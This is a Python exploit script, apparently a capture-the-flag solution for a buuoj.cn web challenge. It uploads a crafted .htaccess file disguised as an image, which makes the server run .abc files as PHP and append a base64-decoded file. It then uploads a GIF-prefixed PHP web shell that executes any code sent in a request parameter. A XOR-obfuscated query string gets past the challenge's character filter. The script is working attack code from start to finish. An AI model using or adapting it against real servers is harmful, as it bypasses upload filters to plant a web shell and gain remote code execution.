import requests
import base64

htaccess = b"""
#define width 1337
#define height 1337 
AddType application/x-httpd-php .abc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_adeee0c170ad4ffb110df0cde294aecd/shell.abc"
"""
shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['a']);?>")
url = r"http://f2f5372d-3345-4247-9e89-aae9759de2dd.node3.buuoj.cn/?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag"

files = {'file':('.htaccess',htaccess,'image/jpeg')}
data = {"upload":"Submit"}
response = requests.post(url=url, data=data, files=files)
print(response.text)

files = {'file':('shell.abc',shell,'image/jpeg')}
response = requests.post(url=url, data=data, files=files)
print(response.text)